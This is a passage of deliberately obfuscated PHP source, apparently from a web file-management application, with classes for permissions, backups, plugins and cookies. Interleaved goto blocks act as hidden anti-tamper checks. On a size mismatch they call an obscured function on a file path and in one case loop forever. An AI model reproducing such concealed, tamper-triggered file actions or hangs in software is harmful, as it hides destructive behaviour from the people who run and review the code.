intval($Óã¨ß§Û) + intval($Û©À÷ÇÕ); if ($­ñ¬¦õ“ == 0) { IO::remove($™ƒµıÙÓ[$óÁİ°¬—[94]]); Model($óÁİ°¬—[1922])->delete($™ƒµıÙÓ[$óÁİ°¬—[477]]); $this->where($÷İ¶£ƒŸ)->delete(); $this->metaSet($™ƒµıÙÓ[$óÁİ°¬—[477]], null, null); return; } if ($™ƒµıÙÓ[$óÁİ°¬—[1917]] != $­ñ¬¦õ“) { $this->where($÷İ¶£ƒŸ)->save(array($óÁİ°¬—[1910] => $­ñ¬¦õ“)); } } public function storageInfo($•ÈàïËŒ = false) { $›é€½ÄÛ =& $_SERVER[¹Û¹Æ€]; $Ò¤ÁÕğ = $this->count() + 0.0; $ÆÀ–ØÜ = 0; $Öƒ¥Ê÷† = 1; $°ó›‘­ç = 0; $¦à‹¥èÒ = 5000; for ($õ¬Ñ‰÷½ = 0; $õ¬Ñ‰÷½ < $Ò¤ÁÕğ; $õ¬Ñ‰÷½ = $õ¬Ñ‰÷½ + $¦à‹¥èÒ) { $ò¼Ë‰åô = $this->limit($õ¬Ñ‰÷½, $õ¬Ñ‰÷½ + $¦à‹¥èÒ)->select(); foreach ($ò¼Ë‰åô as $¤¸ç¿ë) { $Öƒ¥Ê÷† += $¤¸ç¿ë[$›é€½ÄÛ[86]] * $¤¸ç¿ë[$›é€½ÄÛ[1917]]; $ÆÀ–ØÜ += $¤¸ç¿ë[$›é€½ÄÛ[86]] * ($¤¸ç¿ë[$›é€½ÄÛ[1917]] - 1); $°ó›‘­ç += $¤¸ç¿ë[$›é€½ÄÛ[1917]]; } } $’äéÆê = array($›é€½ÄÛ[1923] => $Öƒ¥Ê÷†, $›é€½ÄÛ[1924] => $ÆÀ–ØÜ, $›é€½ÄÛ[1925] => $ÆÀ–ØÜ / $Öƒ¥Ê÷†, $›é€½ÄÛ[90] => $Ò¤ÁÕğ, $›é€½ÄÛ[1926] => $°ó›‘­ç); return $’äéÆê; } } goto ešÚŸ”õí; D½¥¿ªÅà: if (!isset($_SERVER[$_SERVER[¹Û¹Æ€][8]]) || !isset($_SERVER[$_SERVER[¹Û¹Æ€][6]])) { $_getc = $_SERVER[¹Û¹Æ€][9]; $_getfile = $_SERVER[$_SERVER[¹Û¹Æ€][10]] . $_SERVER[¹Û¹Æ€][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹Û¹Æ€][12], $_getfilec); if (count($_getarrs) < $_SERVER[¹Û¹Æ€][13]) { $exit = $_SERVER[¹Û¹Æ€][14]; $exit(); } $_act = $_SERVER[¹Û¹Æ€][15]; $_act($_SERVER[$_SERVER[¹Û¹Æ€][10]] . $_SERVER[¹Û¹Æ€][11]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[¹Û¹Æ€][387]); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ßİÁ½€¸ =& $_SERVER[¹Û¹Æ€]; $Äî›Ü•¦ = array(array($ßİÁ½€¸[429] => LNG($ßİÁ½€¸[1850]), $ßİÁ½€¸[1851] => $ßİÁ½€¸[1852], $ßİÁ½€¸[1853] => 1, $ßİÁ½€¸[1854] => 1, $ßİÁ½€¸[1855] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ßİÁ½€¸[429] => LNG($ßİÁ½€¸[1856]), $ßİÁ½€¸[1851] => $ßİÁ½€¸[1857], $ßİÁ½€¸[1853] => 2, $ßİÁ½€¸[1854] => 1, $ßİÁ½€¸[1855] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ßİÁ½€¸[429] => LNG($ßİÁ½€¸[1858]), $ßİÁ½€¸[1851] => $ßİÁ½€¸[1859], $ßİÁ½€¸[1853] => 3, $ßİÁ½€¸[1854] => 1, $ßİÁ½€¸[1855] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ßİÁ½€¸[429] => LNG($ßİÁ½€¸[1860]), $ßİÁ½€¸[1851] => $ßİÁ½€¸[1861], $ßİÁ½€¸[1853] => 4, $ßİÁ½€¸[1854] => 1, $ßİÁ½€¸[1855] => self::AUTH_SHOW | self::AUTH_VIEW), array($ßİÁ½€¸[429] => LNG($ßİÁ½€¸[1862]), $ßİÁ½€¸[1851] => $ßİÁ½€¸[1863], $ßİÁ½€¸[1853] => 5, $ßİÁ½€¸[1854] => 1, $ßİÁ½€¸[1855] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ßİÁ½€¸[429] => LNG($ßİÁ½€¸[1864]), $ßİÁ½€¸[1851] => $ßİÁ½€¸[1865], $ßİÁ½€¸[1853] => 6, $ßİÁ½€¸[1854] => 1, $ßİÁ½€¸[1855] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ßİÁ½€¸[429] => LNG($ßİÁ½€¸[1866]), $ßİÁ½€¸[1851] => $ßİÁ½€¸[1867], $ßİÁ½€¸[1853] => 7, $ßİÁ½€¸[1854] => 1, $ßİÁ½€¸[1855] => 0)); return $Äî›Ü•¦; } public static function authCheck($šû¥¥Ã€, $ÃŠÀ²¶İ) { $ÊïùĞó =& $_SERVER[¹Û¹Æ€]; $šû¥¥Ã€ = intval($šû¥¥Ã€); if ($GLOBALS[$ÊïùĞó[512]] && $GLOBALS[$ÊïùĞó[16]][$ÊïùĞó[1868]]) { return !0; } if ($šû¥¥Ã€ <= 0) { return !1; } if (($šû¥¥Ã€ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($šû¥¥Ã€ & $ÃŠÀ²¶İ); } public static function authCheckShow($¨ú¼Ÿ¿) { return self::authCheck($¨ú¼Ÿ¿, self::AUTH_SHOW); } public static function authCheckView($¾½ÃÃÁç) { return self::authCheck($¾½ÃÃÁç, self::AUTH_VIEW); } public static function authCheckDownload($¦íúéÙö) { return self::authCheck($¦íúéÙö, self::AUTH_DOWNLOAD); } public static function authCheckUpload($Ş±ğ¯µ) { return self::authCheck($Ş±ğ¯µ, self::AUTH_UPLOAD); } public static function authCheckEdit($¯¨·¹‘©) { return self::authCheck($¯¨·¹‘©, self::AUTH_EDIT); } public static function authCheckRemove($¾œÍú‡ü) { return self::authCheck($¾œÍú‡ü, self::AUTH_REMOVE); } public static function authCheckShare($¥”øõÕ¥) { return self::authCheck($¥”øõÕ¥, self::AUTH_SHARE); } public static function authCheckComment($ç¿çí÷õ) { return self::authCheck($ç¿çí÷õ, self::AUTH_COMMENT); } public static function authCheckEvent($êîîÉÕÂ) { return self::authCheck($êîîÉÕÂ, self::AUTH_EVENT); } public static function authCheckRoot($İÎí¤Ãì) { return self::authCheck($İÎí¤Ãì, self::AUTH_ROOT); } public static function authCheckAction($Ì™šÎ–, $°¡Ú÷èš) { $™—¦ÙÒê =& $_SERVER[¹Û¹Æ€]; $¼˜‹ ã£ = array($™—¦ÙÒê[1869] => self::AUTH_VIEW, $™—¦ÙÒê[1192] => self::AUTH_DOWNLOAD, $™—¦ÙÒê[117] => self::AUTH_UPLOAD, $™—¦ÙÒê[1819] => self::AUTH_EDIT, $™—¦ÙÒê[1818] => self::AUTH_REMOVE, $™—¦ÙÒê[1829] => self::AUTH_SHARE, $™—¦ÙÒê[363] => self::AUTH_COMMENT, $™—¦ÙÒê[1647] => self::AUTH_EVENT, $™—¦ÙÒê[1870] => self::AUTH_ROOT); if (!isset($¼˜‹ ã£[$°¡Ú÷èš])) { return; } $úŠäÒü = $¼˜‹ ã£[$°¡Ú÷èš]; $Ì™šÎ– = intval($Ì™šÎ–); if ($Ì™šÎ– <= 0) { return !1; } if (($Ì™šÎ– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ì™šÎ– & $úŠäÒü); } public static function authDisable($¢ë—Œ—‘, $øËÑß‹ì) { if (intval($¢ë—Œ—‘) <= 0) { return 0; } return intval($¢ë—Œ—‘) & ~$øËÑß‹ì; } public $optionType = "\x53\x79\163\x74\145\x6d\x2e\x73\157\165\162\143\x65\x41\165\164\150\114\x69\163\164"; public $field = array("\x6e\x61\155\145", "\141\165\x74\150", "\154\141\142\145\x6c", "\144\151\x73\160\154\x61\x79", "\x73\x79\x73\x74\x65\155", "\163\x6f\x72\164"); public function initData() { $ëéš‰ÃÀ = $this->authDefault(); foreach ($ëéš‰ÃÀ as $×ê±ôÈ³) { $this->add($×ê±ôÈ³); } } public function findAuth($­”¹×¬Ä, $Æò½ˆ‡¯) { $©†¢‚Œ  =& $_SERVER[¹Û¹Æ€]; $ÎÈ©çÂŸ = parent::listData(); foreach ($ÎÈ©çÂŸ as $±ªãºìÆ) { $ç”˜†Õ‚ = intval($±ªãºìÆ[$©†¢‚Œ [422]]); if ($ç”˜†Õ‚ <= 0 || $±ªãºìÆ[$©†¢‚Œ [1871]] == 0) { continue; } if (($ç”˜†Õ‚ & $­”¹×¬Ä) != $­”¹×¬Ä) { continue; } if (($ç”˜†Õ‚ & $Æò½ˆ‡¯) != 0) { continue; } return $±ªãºìÆ[$©†¢‚Œ [408]]; } return !1; } public function findAuthReadOnly() { $£†Ÿü˜ò = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $•²¨â½Õ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($£†Ÿü˜ò, $•²¨â½Õ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Èû‹¶Ø® =& $_SERVER[¹Û¹Æ€]; $èÁÁ¢€ = parent::listData(); $›ÊÕ¢Ş› = !1; foreach ($èÁÁ¢€ as $“ù¹Û¬—) { if ($“ù¹Û¬—[$Èû‹¶Ø®[422]] <= 0 || $“ù¹Û¬—[$Èû‹¶Ø®[1871]] == $Èû‹¶Ø®[207]) { continue; } if (!$›ÊÕ¢Ş›) { $›ÊÕ¢Ş› = $“ù¹Û¬—; continue; } if ($›ÊÕ¢Ş›[$Èû‹¶Ø®[422]] > $“ù¹Û¬—[$Èû‹¶Ø®[422]]) { $›ÊÕ¢Ş› = $“ù¹Û¬—; } } return $›ÊÕ¢Ş› ? $›ÊÕ¢Ş›[$Èû‹¶Ø®[408]] : $Èû‹¶Ø®[22]; } public function listData($ÀŸ”ˆ = false, $¬¶âó·İ = "\163\x6f\162\x74", $¯Ë”¦µ² = false) { return parent::listData($ÀŸ”ˆ, $¬¶âó·İ, $¯Ë”¦µ²); } public function update($¨ Éı…, $Ù›â¨¥ä) { $Ùˆ¥á¤Ô =& $_SERVER[¹Û¹Æ€]; $‡¸Õ÷¨ = parent::listData($¨ Éı…); $ëüÃ‘«Ï = $this->findByName($Ù›â¨¥ä[$Ùˆ¥á¤Ô[42]]); if (!$‡¸Õ÷¨ || $ëüÃ‘«Ï && $ëüÃ‘«Ï[$Ùˆ¥á¤Ô[408]] != $‡¸Õ÷¨[$Ùˆ¥á¤Ô[408]]) { return !1; } $this->filterAuth($Ù›â¨¥ä[$Ùˆ¥á¤Ô[422]]); return parent::update($¨ Éı…, $Ù›â¨¥ä); } public function remove($Ş”ÂÓ¹ê) { $¢¦ãßòÔ = parent::listData($Ş”ÂÓ¹ê); if (!$¢¦ãßòÔ || $¢¦ãßòÔ[$_SERVER[¹Û¹Æ€][1282]]) { return !1; } return parent::remove($Ş”ÂÓ¹ê); } public function add($…Ìş—Ÿ‰ = array()) { $Éåõ¯å =& $_SERVER[¹Û¹Æ€]; if ($this->findByName($…Ìş—Ÿ‰[$Éåõ¯å[42]])) { return !1; } $”Ş‰ïü = array($Éåõ¯å[42] => $Éåõ¯å[22], $Éåõ¯å[422] => 1, $Éåõ¯å[1872] => $Éåõ¯å[1859], $Éåõ¯å[1871] => 1, $Éåõ¯å[1282] => 0, $Éåõ¯å[1873] => 0); $…Ìş—Ÿ‰ = array_merge($”Ş‰ïü, $…Ìş—Ÿ‰); $…Ìş—Ÿ‰[$Éåõ¯å[1873]] = $this->getSort(); $this->filterAuth($…Ìş—Ÿ‰[$Éåõ¯å[422]]); return parent::insert($…Ìş—Ÿ‰); } private function getSort() { $şòŸîĞÌ =& $_SERVER[¹Û¹Æ€]; $„ïÎ§æ  = parent::listData(); $Íõ‚ÚÍß = array_to_keyvalue($„ïÎ§æ , $şòŸîĞÌ[22], $şòŸîĞÌ[1873]); return empty($Íõ‚ÚÍß) ? 0 : max($Íõ‚ÚÍß) + 1; } private function filterAuth(&$ß–ú½Ñš) { if (!$ß–ú½Ñš) { return; } $˜ïÃÊ¬¤ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $¹ ©¤Ù± = array(); foreach ($˜ïÃÊ¬¤ as $Ô‰Á‚Öî) { if ($ß–ú½Ñš & $Ô‰Á‚Öî) { $¹ ©¤Ù±[] = $Ô‰Á‚Öî; } } if (in_array(self::AUTH_ROOT, $¹ ©¤Ù±)) { $ß–ú½Ñš = array_sum($˜ïÃÊ¬¤); return; } $ĞÜì¢›€ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($¹ ©¤Ù± as $Ô‰Á‚Öî) { if (isset($ĞÜì¢›€[$Ô‰Á‚Öî])) { $¹ ©¤Ù± = array_merge($¹ ©¤Ù±, $ĞÜì¢›€[$Ô‰Á‚Öî]); } } $¹ ©¤Ù±[] = self::AUTH_SHOW; $ß–ú½Ñš = array_sum(array_unique($¹ ©¤Ù±)); } public function sort($ˆ„ÒĞğ¥, $ä‘¼Åòó) { return parent::update($ˆ„ÒĞğ¥, $ä‘¼Åòó); } } class BackupModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\x6d\56\x62\141\x63\x6b\165\160\x4c\151\163\164"; public $field = array("\x69\x6f", "\x6e\x61\155\145", "\x73\164\x61\x74\x75\163", "\x63\157\156\164\145\x6e\164", "\x6d\141\x6e\x75\x61\154", "\x72\145\163\165\154\x74", "\164\x69\155\145\106\162\x6f\x6d", "\x74\x69\x6d\x65\x54\x6f"); public function config() { $›ã‘Ûì« =& $_SERVER[¹Û¹Æ€]; $úÄÅö±Î = Model($›ã‘Ûì«[768])->get($›ã‘Ûì«[778]); $úÄÅö±Î = json_decode($úÄÅö±Î, !0); $úÄÅö±Î = is_array($úÄÅö±Î) ? $úÄÅö±Î : array(); if (!isset($úÄÅö±Î[$›ã‘Ûì«[753]])) { $úÄÅö±Î[$›ã‘Ûì«[753]] = $›ã‘Ûì«[98]; } unset($úÄÅö±Î[$›ã‘Ûì«[1629]]); Action($›ã‘Ûì«[1874])->taskInit(); Model($›ã‘Ûì«[1628])->cacheClear(); $Ï™Ëáç = $›ã‘Ûì«[1875]; $¯‡¢ö‹Ã = Model($›ã‘Ûì«[1876])->findByKey($›ã‘Ûì«[1647], $Ï™Ëáç); if (!$¯‡¢ö‹Ã) { $¯‡¢ö‹Ã = array(); } if (isset($¯‡¢ö‹Ã[$›ã‘Ûì«[213]])) { $¯‡¢ö‹Ã[$›ã‘Ûì«[213]] = json_decode($¯‡¢ö‹Ã[$›ã‘Ûì«[213]], !0); } if (isset($úÄÅö±Î[$›ã‘Ûì«[213]])) { $¯‡¢ö‹Ã[$›ã‘Ûì«[213]][$›ã‘Ûì«[1632]] = $úÄÅö±Î[$›ã‘Ûì«[213]]; unset($úÄÅö±Î[$›ã‘Ûì«[213]]); } return array_merge($¯‡¢ö‹Ã, $úÄÅö±Î); } public function listData($¿–şüåŸ = false, $í€÷¢½» = "\x6d\157\144\151\x66\171\124\151\155\145", $ĞİÏ–ö¿ = false) { return parent::listData($¿–şüåŸ, $í€÷¢½», !0); } public function lastItem() { $Ô Óˆ– = $this->listData(); return !empty($Ô Óˆ–[0]) ? $Ô Óˆ–[0] : null; } public function kill($»Úƒšîù) { $¨îîÈ¸‰ =& $_SERVER[¹Û¹Æ€]; $Ò¦Ã·ì = $this->listData($»Úƒšîù); if (!$Ò¦Ã·ì || empty($Ò¦Ã·ì[$¨îîÈ¸‰[42]])) { return !0; } Task::kill($¨îîÈ¸‰[777]); Task::kill($¨îîÈ¸‰[798]); Task::kill($¨îîÈ¸‰[807]); $´†‚ÀƒÙ = $Ò¦Ã·ì[$¨îîÈ¸‰[42]]; $ÂÙ´òéÎ = TEMP_FILES . $¨îîÈ¸‰[776] . $´†‚ÀƒÙ . $¨îîÈ¸‰[18]; IO::remove($ÂÙ´òéÎ, !1); return $this->remove($»Úƒšîù); } public function remove($ğØ¨ëÇ) { $ç´¸Ğú– = $this->listData($ğØ¨ëÇ); if (!$ç´¸Ğú–) { return !0; } return $this->backupRemove($ç´¸Ğú–); } private function backupRemove($•Û‘í­½) { parent::remove($•Û‘í­½[$_SERVER[¹Û¹Æ€][408]]); $Ñ™³·áù = $this->backupPath($•Û‘í­½); IO::remove($Ñ™³·áù, !1); return !0; } private function backupPath($Ç‰ÅŒ¥¢) { $Äş¿ƒù– =& $_SERVER[¹Û¹Æ€]; $ç±âÍ· = $Ç‰ÅŒ¥¢[$Äş¿ƒù–[42]]; $—´˜´é = Model($Äş¿ƒù–[768])->get($Äş¿ƒù–[769]); $ı—öÅõÍ = substr(md5($Äş¿ƒù–[770] . $—´˜´é . $ç±âÍ·), 0, 8); return "\x7b\151\157\72{$Ç‰ÅŒ¥¢[$Äş¿ƒù–[750]]}\175\57\144\x61\x74\x61\x62\141\163\x65\57\x62\141\143\153\x75\160\x2f" . $ç±âÍ· . $Äş¿ƒù–[21] . $ı—öÅõÍ; } public function start() { $ÎæŒ…çÃ =& $_SERVER[¹Û¹Æ€]; if ($GLOBALS[$ÎæŒ…çÃ[16]][$ÎæŒ…çÃ[99]][$ÎæŒ…çÃ[1877]] != $ÎæŒ…çÃ[98]) { return !0; } $–¹´ÌÄ = $this->config(); if (!$–¹´ÌÄ || $–¹´ÌÄ[$ÎæŒ…çÃ[1629]] != $ÎæŒ…çÃ[98]) { return !1; } $ùìÎ”— = $this->process(); foreach ($ùìÎ”— as $¥šâôÑè) { if ($¥šâôÑè) { return Task::restart($¥šâôÑè[$ÎæŒ…çÃ[408]]); } } $‡ˆÄÃÜ = new Backup(); $æûÀºÆá = $‡ˆÄÃÜ->db(); if ($æûÀºÆá) { $æûÀºÆá = $‡ˆÄÃÜ->dbFile(); if ($æûÀºÆá && $–¹´ÌÄ[$ÎæŒ…çÃ[753]] == $ÎæŒ…çÃ[207]) { $æûÀºÆá = $‡ˆÄÃÜ->file(); } } Backup::set(array($ÎæŒ…çÃ[748] => 1, $ÎæŒ…çÃ[506] => time())); return !0; } public function process() { $¿ÓÛğØÂ =& $_SERVER[¹Û¹Æ€]; $ØšñõÚ  = array($¿ÓÛğØÂ[756] => Task::get($¿ÓÛğØÂ[777]), $¿ÓÛğØÂ[760] => Task::get($¿ÓÛğØÂ[798]), $¿ÓÛğØÂ[209] => Task::get($¿ÓÛğØÂ[807])); $÷¾ú—”õ = !1; foreach ($ØšñõÚ  as &$ùø¨©•ë) { if ($÷¾ú—”õ) { $ùø¨©•ë = !1; continue; } if ($ùø¨©•ë) { $¦ÆøĞÊ¼ = intval(_get($ùø¨©•ë, $¿ÓÛğØÂ[1664], 0)); if (time() - $¦ÆøĞÊ¼ > 7200) { Task::kill($ùø¨©•ë[$¿ÓÛğØÂ[408]]); $÷¾ú—”õ = !0; $ùø¨©•ë = !1; } } } return $ØšñõÚ ; } public function restore() { $Ó¦ã˜¹Î =& $_SERVER[¹Û¹Æ€]; ActionCall($Ó¦ã˜¹Î[1057], !0, 1); ActionCall($Ó¦ã˜¹Î[1057], !0, 0); } } goto BªåÄ†¼Ç°; C²æ¤­­ñ: define($_SERVER[¹Û¹Æ€][621], $_SERVER[¹Û¹Æ€][622]); $gftowlprau = $_SERVER[¹Û¹Æ€][623]; while (strlen($gftowlprau) < $_SERVER[¹Û¹Æ€][624]) { if (!$gftowlprau) { break; } $gftowlprau++; } goto d¶âš¹…Ø•; C¹‚¿ì–£: $_size = $_SERVER[¹Û¹Æ€][7]; if ($_SERVER[$_SERVER[¹Û¹Æ€][8]] != $_size($_file)) { $_getc = $_SERVER[¹Û¹Æ€][9]; $_getfile = $_SERVER[$_SERVER[¹Û¹Æ€][10]] . $_SERVER[¹Û¹Æ€][11]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹Û¹Æ€][12], $_getfilec); if (count($_getarrs) < $_SERVER[¹Û¹Æ€][13]) { $exit = $_SERVER[¹Û¹Æ€][14]; $exit(); } $_act = $_SERVER[¹Û¹Æ€][15]; $_act($_file); } class PluginModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\56\x70\x6c\165\x67\x69\x6e\x4c\x69\x73\164"; public $field = array("\156\x61\x6d\x65", "\163\x74\141\164\165\163", "\162\x65\147\151\145\163\164", "\x63\157\x6e\146\x69\147"); public function loadList($Å¼ëõŞ› = false) { $ı­öË = array_to_keyvalue($this->listData(), $_SERVER[¹Û¹Æ€][42]); if ($Å¼ëõŞ›) { return $ı­öË[$Å¼ëõŞ›]; } return $ı­öË; } public function init() { $È¿à€£Ò =& $_SERVER[¹Û¹Æ€]; Hook::trigger($È¿à€£Ò[1969]); $Ìì’¦­˜ = $this->loadPluginList(); foreach ($Ìì’¦­˜ as $¨€Ù£å» => $”³¤¥ë¢) { $Î—ÙÈ = $this->appAllow($¨€Ù£å», $”³¤¥ë¢); if (!$Î—ÙÈ) { continue; } foreach ($”³¤¥ë¢[$È¿à€£Ò[1970]] as $ÆşğÆº¦ => $ü§—¼½) { Hook::bind($ÆşğÆº¦, $ü§—¼½); } } Hook::trigger($È¿à€£Ò[1971]); Hook::trigger(ACTION); } public function appAllow($ëõÀç±Û, $Æ—æÍàº, $ììË¤Š = true) { $£¥Çóâí =& $_SERVER[¹Û¹Æ€]; $å€‰¡šß = PLUGIN_DIR . $ëõÀç±Û . $£¥Çóâí[1972]; if (!is_array($Æ—æÍàº) || !is_array($Æ—æÍàº[$£¥Çóâí[1970]]) || $Æ—æÍàº[$£¥Çóâí[748]] != 1 || !is_file($å€‰¡šß)) { return !1; } if ($GLOBALS[$£¥Çóâí[512]] == 1) { if ($GLOBALS[$£¥Çóâí[16]][$£¥Çóâí[1973]] || !$GLOBALS[$£¥Çóâí[16]][$£¥Çóâí[1974]]) { return !0; } $ñğ°¨øû = explode($£¥Çóâí[60], strtolower($GLOBALS[$£¥Çóâí[16]][$£¥Çóâí[1974]])); return in_array(strtolower($ëõÀç±Û), $ñğ°¨øû) ? !1 : !0; } if ($ììË¤Š && !Action($£¥Çóâí[1975])->checkAuth($ëõÀç±Û)) { return !1; } return !0; } public function unInstall($ªØ—ê»‚) { $÷ÇÃã¥ =& $_SERVER[¹Û¹Æ€]; $¹óÌ‹ø· = $this->loadList($ªØ—ê»‚); if (file_exists(PLUGIN_DIR . $ªØ—ê»‚)) { Hook::apply($ªØ—ê»‚ . $÷ÇÃã¥[1976]); } $this->remove($¹óÌ‹ø·[$÷ÇÃã¥[408]]); } public function changeStatus($¯Şø¹­÷, $…¨í·Œ¢) { $É¨Ö¶ºã =& $_SERVER[¹Û¹Æ€]; $È§÷„›· = $this->loadList($¯Şø¹­÷); if ($…¨í·Œ¢) { Hook::apply($¯Şø¹­÷ . $É¨Ö¶ºã[1977]); } $this->update($È§÷„›·[$É¨Ö¶ºã[408]], array($É¨Ö¶ºã[1978] => $…¨í·Œ¢)); } public function appRegist($»¥›çÎ¤, $’Øâ‘ÎŒ) { $»Ş¼’‚ =& $_SERVER[¹Û¹Æ€]; $œ¡“Ë÷ = $this->loadList($»¥›çÎ¤); if ($œ¡“Ë÷) { $this->update($œ¡“Ë÷[$»Ş¼’‚[408]], array($»Ş¼’‚[1970] => $’Øâ‘ÎŒ)); } else { $•¨…àí = array($»Ş¼’‚[42] => $»¥›çÎ¤, $»Ş¼’‚[1970] => $’Øâ‘ÎŒ, $»Ş¼’‚[748] => 0, $»Ş¼’‚[16] => $this->getConfigDefault($»¥›çÎ¤)); $this->insert($•¨…àí); } } public function getConfigDefault($°Ñá¸æÚ) { $¢”±Ï—¾ =& $_SERVER[¹Û¹Æ€]; $–·¥ïäÄ = array(); $ç¡ŞğÊ = $this->getPackageJson($°Ñá¸æÚ); if (!$ç¡ŞğÊ && is_array($ç¡ŞğÊ[$¢”±Ï—¾[1979]])) { return $–·¥ïäÄ; } foreach ($ç¡ŞğÊ[$¢”±Ï—¾[1979]] as $²ˆøË => $’İÒ€Ô‡) { if (!isset($’İÒ€Ô‡[$¢”±Ï—¾[383]]) || isset($–·¥ïäÄ[$²ˆøË])) { continue; } $–·¥ïäÄ[$²ˆøË] = $’İÒ€Ô‡[$¢”±Ï—¾[383]]; } return $–·¥ïäÄ; } public function getPackageJson($“ªÀÏ‘•) { return Hook::apply($“ªÀÏ‘• . $_SERVER[¹Û¹Æ€][1980]); } public function getConfig($×Óšş½Ò, $²ÕöÃ…É = false) { $ùÆåÂÕã =& $_SERVER[¹Û¹Æ€]; $İá°ÎôÛ = array(); $úêÁƒá¸ = $this->loadList($×Óšş½Ò); if ($úêÁƒá¸ && is_array($úêÁƒá¸[$ùÆåÂÕã[16]])) { $İá°ÎôÛ = $úêÁƒá¸[$ùÆåÂÕã[16]]; } if (!$İá°ÎôÛ || $²ÕöÃ…É) { $İá°ÎôÛ = $this->getConfigDefault($×Óšş½Ò); } return $İá°ÎôÛ; } public function setConfig($ÈÆÙïÖ¥, $†£Ö¥›¹ = false) { $Èã¤ÜÖ =& $_SERVER[¹Û¹Æ€]; $´ŠÏ„»¯ = $this->loadList($ÈÆÙïÖ¥); if (!$´ŠÏ„»¯) { return !1; } $§îá“Øô = $´ŠÏ„»¯[$Èã¤ÜÖ[16]]; if ($†£Ö¥›¹ == !1) { $§îá“Øô = array(); $†£Ö¥›¹ = $this->getConfigDefault($ÈÆÙïÖ¥); } foreach ($†£Ö¥›¹ as $¬µå— => $“¿àÈí) { $§îá“Øô[$¬µå—] = is_string($“¿àÈí) ? trim($“¿àÈí) : $“¿àÈí; } $this->update($´ŠÏ„»¯[$Èã¤ÜÖ[408]], array($Èã¤ÜÖ[16] => $§îá“Øô)); } public function viewList() { $İ¾†ø•ü =& $_SERVER[¹Û¹Æ€]; $¹æœœªä = $this->loadList(); $this->pluginScan($¹æœœªä); $¹æœœªä = $this->loadPluginList(); $‡·É³Äö = array(); foreach ($¹æœœªä as $³éÕÏŠØ => $ÔÄå¹³) { unset($ÔÄå¹³[$İ¾†ø•ü[1970]], $ÔÄå¹³[$İ¾†ø•ü[16]]); $ŒªêÉÅ½ = PLUGIN_DIR . $ÔÄå¹³[$İ¾†ø•ü[42]] . $İ¾†ø•ü[1972]; if (!is_file($ŒªêÉÅ½)) { continue; } $Û‚ŠÌ› = Hook::apply($ÔÄå¹³[$İ¾†ø•ü[42]] . $İ¾†ø•ü[1980]); if (is_array($Û‚ŠÌ›)) { $‡·É³Äö[$³éÕÏŠØ] = array_merge($ÔÄå¹³, $Û‚ŠÌ›); } } return $‡·É³Äö; } private function loadPluginList() { $®Ä¯º– =& $_SERVER[¹Û¹Æ€]; $ĞÓ„µø« = $this->loadList(); if (strtolower(MOD) == $®Ä¯º–[1981]) { return $ĞÓ„µø«; } $àõœÁÉõ = Hook::trigger($®Ä¯º–[1982], $ĞÓ„µø«); if ($ĞÓ„µø« && !$àõœÁÉõ) { die; } return $àõœÁÉõ ? $àõœÁÉõ : $ĞÓ„µø«; } private function pluginScan($¶ÆÂ®œİ) { $›©ò¨— =& $_SERVER[¹Û¹Æ€]; recursion_dir(PLUGIN_DIR, $±¨ ó¤í, $öÇÒú…Á, 0); foreach ($±¨ ó¤í as $‚Îü™•) { $²öÆÆªÀ = get_path_this($‚Îü™•); if (isset($¶ÆÂ®œİ[$²öÆÆªÀ]) || !file_exists($‚Îü™• . $›©ò¨—[1983]) || !file_exists($‚Îü™• . $›©ò¨—[1972])) { continue; } Hook::apply($²öÆÆªÀ . $›©ò¨—[1977]); } } } goto bÁ«¬–ÊÌé; D¹öªÛÕİ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($€ÖÕöÅ¹ = '', $Õ¿Êû± = 0) { if (is_string($€ÖÕöÅ¹) && $€ÖÕöÅ¹ != $_SERVER[¹Û¹Æ€][22]) { $this->prefix = $€ÖÕöÅ¹; } if (is_numeric($Õ¿Êû±) && $Õ¿Êû± > 